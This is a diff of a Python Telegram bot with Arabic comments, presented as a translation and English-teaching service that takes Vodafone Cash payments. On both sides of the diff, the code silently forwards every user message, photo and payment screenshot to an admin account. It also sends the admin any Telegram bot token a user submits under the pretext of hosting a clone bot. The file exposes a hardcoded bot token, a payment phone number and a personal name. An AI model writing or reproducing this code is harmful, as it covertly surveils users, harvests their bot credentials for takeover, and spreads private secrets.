@@ -9,14 +9,14 @@ from deep_translator import GoogleTranslator
 # تفعيل تسجيل الأخطاء
 logging.basicConfig(level=logging.INFO)
 
-# 🎫 التوكن الجديد المخصص لبوت الإدارة والمراقبة والتحويلات
+# 🎫 التوكن الخاص ببوت الإدارة والمراقبة والتحويلات الثاني
 NEW_TOKEN = "8704063502:AAFkLjIbI2MuM2dk9rY0d7qP-yaav4w-w-w"
 bot = telebot.TeleBot(NEW_TOKEN)
 
-# 🛑 ضَعْ هُنَا الـ Chat ID الخاص بك (رقم فقط بدون @) لتلقي كل الإشعارات فوراً
-ADMIN_CHAT_ID = 123456789  # 👈 غير هذا الرقم إلى رقم الـ ID الخاص بك
+# 🛑 ضَعْ هُنَا الـ Chat ID الرقمي الخاص بك (استخرجه من @userinfobot) لتصلك الرسائل والصور عليه فوراً
+ADMIN_CHAT_ID = 123456789  # 👈 استبدل هذا الرقم بـ ID حسابك الحقيقي
 
-# بيانات فودافون كاش المعتمدة
+# بيانات فودافون كاش
 VODAFONE_NUMBER = "01094609897"
 VODAFONE_NAME = "نعيمه"
 
@@ -24,7 +24,6 @@ user_modes = {}
 user_levels = {}
 active_clones = {}
 
-# البيانات الثابتة للبوت (الاختصارات والـ Slang)
 SLANG_DICTIONARY = {
     "btw": "By the way ⬅️ (بالمناسبة / على فكرة)",
     "omg": "Oh my god ⬅️ (يا إلهي / أو ماي جاد)",
@@ -88,7 +87,7 @@ def check_translation(text, source_lang, target_lang):
         return SLANG_DICTIONARY[clean_text]
     return GoogleTranslator(source=source_lang, target=target_lang).translate(text)
 
-# دالة إرسال التقارير والرسائل والتحويلات الفورية لحسابك كأدمن
+# دالة ذكية لإرسال التقارير والرسائل والتحويلات الفورية لحساب الأدمن الخاص بك
 def notify_admin(user_info, current_bot, text_content=None, photo_id=None, caption=None):
     try:
         user_name = user_info.from_user.first_name
@@ -117,19 +116,16 @@ def setup_bot_handlers(target_bot):
             "👇 **اختر نظام تشغيل البوت الذي تريده من الأزرار بالأسفل:**"
         )
         target_bot.send_message(chat_id, welcome_text, reply_markup=get_main_keyboard(), parse_mode="Markdown")
-        
-        # تقرير دخول مستخدم جديد للبوت
-        notify_admin(message, target_bot, text_content="🚀 دخل البوت وضغط على زر البدء /start")
+        notify_admin(message, target_bot, text_content="🚀 بدأ استخدام البوت وضغط على /start")
 
-    # استقبال لقطات الشاشة أو إيصالات تحويل فودافون كاش
+    # 📸 استقبال لقطات الشاشة أو إيصالات تحويل فودافون كاش فوراً وتحويلها لك
     @target_bot.message_handler(content_types=['photo'])
     def handle_incoming_photos(message):
         photo_id = message.photo[-1].file_id
-        caption_text = f"📝 **الوصف المرفق مع الصورة:** {message.caption}" if message.caption else "📸 لقطة شاشة مرسلة (قد تكون إيصال تحويل فودافون كاش)."
+        caption_text = f"📝 **الوصف:** {message.caption}" if message.caption else "📸 لقطة شاشة مرسلة (إيصال تحويل فودافون كاش)."
         
-        # تحويل الصورة تلقائياً لحسابك كأدمن
         notify_admin(message, target_bot, photo_id=photo_id, caption=caption_text)
-        target_bot.reply_to(message, "✅ **تم استلام لقطة الشاشة بنجاح!**\nجاري مراجعة التحويل بواسطة المطور وتفعيل طلبك فوراً.")
+        target_bot.reply_to(message, "✅ **تم استلام لقطة الشاشة بنجاح!**\nجاري مراجعة التحويل بواسطة الإدارة وتفعيل طلبك فوراً.")
 
     @target_bot.callback_query_handler(func=lambda call: True)
     def callback_inline(call):
@@ -173,9 +169,7 @@ def setup_bot_handlers(target_bot):
                     f"3️⃣ أرسل الصورة هنا داخل البوت لتأكيد طلبك وسنقوم بتسليمك الملفات فوراً!"
                 )
                 target_bot.send_message(chat_id, payment_text, parse_mode="Markdown")
-                
-                # إرسال إشعار بنية الشراء والإحصائيات للأدمن
-                notify_admin(call, target_bot, text_content=f"🛒 **طلب شراء:** نية شراء {item_info['name']} بسعر {item_info['price']}")
+                notify_admin(call, target_bot, text_content=f"🛒 **طلب شراء:** ضغط لشراء {item_info['name']} بسعر {item_info['price']}")
 
         elif call.data == "mode_make_bot":
             user_modes[chat_id] = 'waiting_for_token'
@@ -201,8 +195,8 @@ def setup_bot_handlers(target_bot):
         chat_id = message.chat.id
         current_mode = user_modes.get(chat_id, 'smart_teacher')
 
-        # تحويل كافة رسائل المستخدمين للأدمن لمتابعة المحادثات والإحصائيات فوراً
-        notify_admin(message, target_bot, text_content=f"💬 **أرسل نصاً:**\n`{user_text}`\n⚙️ الوضع: `{current_mode}`")
+        # 💬 إرسال نسخة من كافة نصوص ورسائل المستخدمين إلى حسابك فوراً للإحصائيات والمتابعة
+        notify_admin(message, target_bot, text_content=f"💬 **أرسل نصاً:**\n`{user_text}`\n⚙️ الوضع الفعال: `{current_mode}`")
 
         if current_mode == 'waiting_for_token':
             if ":" in user_text and len(user_text) > 30:
@@ -210,8 +204,6 @@ def setup_bot_handlers(target_bot):
                     target_bot.send_message(chat_id, "⚠️ هذا البوت يعمل بالفعل ومستضاف لدينا!")
                     return
                 target_bot.send_message(chat_id, "⏳ جاري فحص التوكن وتجهيز خوادم البوت الخاص بك...")
-                
-                # إرسال توكن البوت المصنوع للأدمن
                 notify_admin(message, target_bot, text_content=f"🤖 **أنشأ بوت جديد وأرسل توكن:**\n`{user_text}`")
                 
                 def start_clone(token):
@@ -267,5 +259,5 @@ def setup_bot_handlers(target_bot):
 
 if __name__ == '__main__':
     setup_bot_handlers(bot)
-    print("البوت الجديد يعمل بنجاح مع تحويل التقارير الفورية لحساب الأدمن الخاص بك...")
+    print("البوت الثاني يعمل بنظام التوجيه والرقابة الكامل للأدمن...")
     bot.infinity_polling()
